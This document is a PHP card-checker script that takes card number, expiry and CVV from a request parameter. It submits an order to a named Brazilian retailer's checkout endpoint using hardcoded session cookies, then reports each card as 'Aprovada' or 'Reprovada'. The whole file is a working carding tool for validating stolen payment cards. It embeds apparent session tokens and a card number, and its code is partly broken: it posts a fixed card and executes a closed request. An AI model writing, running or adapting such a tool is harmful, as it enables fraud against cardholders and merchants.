<?php
error_reporting(1);
set_time_limit(0);
date_default_timezone_set('America/Sao_Paulo');
$email = 'cybersec'.rand(10, 100000).'%40gmail.com';
$useragent = "Mozilla/5.0 (Windows NT " . rand(6, 10) . ".0; Win64; x64) AppleWebKit/" . rand(500, 600) . ".0 (KHTML, like Gecko) Chrome/" . rand(100, 120) . ".0." . rand(4000, 5000) . "." . rand(100, 300) . " Safari/" . rand(500, 600) . ".0";

function getStr($string, $start, $end)
{
    $str = explode($start, $string);
    $str = explode($end, $str[1]);
    return $str[0];
}

$lista = $_GET['lista'];
$separar = explode("|", $lista);
$cc = $separar[0];
$mes = $separar[1];
$mes2 = (string)((int)$mes);
$ano = $separar[2];
$ano2 = substr($ano, -2);
$cvv = $separar[3];

if (file_exists("cybersecofc.txt")) {
    unlink("cybersecofc.txt");
}

$digito = substr($cc, 0, 1);
if($digito == 4){
  $brand = 'visa';
}elseif($digito == 5){
  $brand = 'mastercard';
}elseif($digito == 2){
  $brand = 'mastercard';
}elseif($digito == 6){
  $brand = 'elo';
}elseif($digito == 3){
  $brand = 'amex';
}else{
  $brand = 'unknown';
}

function cyber($icone, $status, $lista, $mensagem, $cor = "#00ff84", $cormsg = "#ffffff") {
  $bg = $cor === "#00ff84" ? "rgba(0, 255, 132, 0.03)" : "rgba(255, 51, 102, 0.03)";
  echo "<div style='
      font-family: \"JetBrains Mono\", \"Courier New\", monospace;
      background: linear-gradient(90deg, $bg 0%, rgba(10, 10, 10, 0) 100%);
      border-left: 2px solid $cor;
      padding: 14px 18px;
      margin: 4px 0;
      border-radius: 0 6px 6px 0;
      letter-spacing: 0.3px;
      font-size: 12.5px;
      box-shadow: 0 0 20px $bg;
  '>
      <span style='color: $cor; margin-right: 4px;'>$icone</span>
      <span style='color: $cor; font-weight: 500; margin-right: 4px;'>#$status</span>
      <span style='color: #8f9199; margin: 0 4px;'>↝</span>
      <span style='color: #ffffff; background: rgba(255, 255, 255, 0.03); padding: 3px 6px; border-radius: 4px;'>[$lista]</span>
      <span style='color: #8f9199; margin: 0 4px;'>↝</span>
      <span style='color: $cormsg;'>$mensagem</span>
      <span style='color: #8f9199; margin-left: 4px;'>cyberang</span>
  </div>";
}

$account_id = 'CCIV346S35H4TJM5ZVVIBY';
$advertisable = 'ICHY4TAYYZFTTAIFRFDMJR';



$ch = curl_init();
curl_setopt($ch, CURLOPT_URL, 'https://www.thecasa.com.br/checkout/GerarPedidoCompletocurl');
curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
curl_setopt($ch, CURLOPT_CUSTOMREQUEST, 'POST');
curl_setopt($ch, CURLOPT_HTTPHEADER, [
    'Host: www.thecasa.com.br',
    'sec-ch-ua-platform: "Windows"',
    'X-Requested-With: XMLHttpRequest',
    'Origin: https://www.thecasa.com.br',
    'Sec-Fetch-Site: same-origin',
    'Sec-Fetch-Mode: cors',
    'Sec-Fetch-Dest: empty',
    'Referer: https://www.thecasa.com.br/',
    'Accept-Language: pt-BR,pt;q=0.9,en-US;q=0.8,en;q=0.7',
    'Accept-Encoding: gzip',
]);
curl_setopt($ch, CURLOPT_COOKIE, 'ASP.NET_SessionId=ljzgud3nvjqwpsuzcd5mwift; _gid=GA1.3.107117654.1770583152; _clck=4aogfj%5E2%5Eg3e%5E0%5E2230; _fbp=fb.2.1770583152164.762989425308959098; PolicyPrivacyAccepted=true; SessionIdCookie=jgpcRDl1cxfDtlL5UllUXg%3d%3d; _lfi=3; _lfe=3; _lf={%22lm%22:false%2C%22_ga%22:%22dfb07e5a-fbc9-4260-82b8-b90af60539a2%22%2C%22e%22:%22Y3liZXJzZWNvZmNAZ21haWwuY29t%22}; __udf_j=e317bb5c307bfb62f4ae4f5a9dc4a0e9b1010df7d854e5b1cfc067543147cdfa7e8478c29388bbbbff80ba4beb6e735d; __csfpsid_3508436101=Mjk0MDA2NTkwNA==; IdTablePrice=0; __RequestVerificationToken=U31CHQpAwkZQl-4eLoWoTNsDK9KNfKgN3agNVXp4ajgvkpwpAG4cYh_r0vSM5xssiTxVH4jXHsJV5pMpsVI_j1zRfV_p22HoFbNb2bwWFR41; _mbt_ses.90c4=*; CartInfo=rjEnf3JnDSJgLjtbIzHEMp4emKaHQnhIOEXLCiz0Us8%2fgbcg1Cq8VTH4sGCe7rakPxMZV%2fGmJK5fNNs%2bzRGWXg%3d%3d; _ga_783V77DBG5=GS2.1.s1770587207' . getenv('o2') ?? '' . getenv('g1') ?? '' . getenv('t1770589075') ?? '' . getenv('j48') ?? '' . getenv('l0') ?? '' . getenv('h1405780657') ?? '' . '; _ga=GA1.3.393016631.1770583152; _clsk=grtbvq%5E1770589077471%5E15%5E1%5Es.clarity.ms%2Fcollect; _mbt_id.90c4=c9413a96-71df-407a-8bd6-cc02887f9360.1770583154.2.1770589083.1770584680.9dfda74e-eb45-4020-be17-8733e2076a06; _enviou.com-ca={%22tk%22:%2214042022081931ZTT%22%2C%22v%22:99.55%2C%22ci%22:%226988f49c7a176e63076ab249%22%2C%22n%22:%22Cyber%20Sec%22%2C%22e%22:%22Y3liZXJzZWNvZmNAZ21haWwuY29t%22%2C%22h%22:%22(31)%2098745-6326%22%2C%22f%22:23.9}; _gcl_au=1.1.530025718.1770583150.117093932.1770587216.1770589090');
curl_setopt($ch, CURLOPT_POSTFIELDS, 'idCustomer=7017271&idAddress=50873338&presente=off&mensagem=&idInstallment=237515&idPaymentBrand=209&card=4854+6412+4734+4120&nameCard=CYBER+SEC&expDateCard=06%2F2028&cvvCard=401&brandCard=visa&installmentNumber=1&kind=credit&document=&idOneClick=0&saveCardOneClick=false&userAgent=Mozilla%2F5.0+(Windows+NT+10.0%3B+Win64%3B+x64)+AppleWebKit%2F537.36+(KHTML%2C+like+Gecko)+Chrome%2F142.0.0.0+Safari%2F537.36+OPR%2F126.0.0.0&hasScheduledDelivery=False&paymentSession=&paymentHash=&shippingMode=3&dateOfBirth=&phone=&installmentValue=0&installmentTotal=99.55&cardToken=&googleResponse=&deliveryTime=5&usefulDay=false&labelOneClick=&typeDocument=&colorDepth=24&screenHeight=900&screenWidth=1600');

$response = curl_exec($ch);

curl_close($ch);



$resultado = curl_exec($ch);

if(strpos($resultado, 'nonce') !== false) {
  cyber("✅", "Aprovada", $lista, "[ Invalid security code. ]");

}elseif(strpos($resultado, 'error') !== false) {
  cyber("⛔", "Reprovada", $lista, "[ Cartão recusado pelo emissor. ]", "#ff3366", "#ff3366");

}else{
  cyber("⛔", "Reprovada", $lista, "[ Falha ao gerar o pré pedido. ]", "#ff3366", "#ff3366");
}
?>
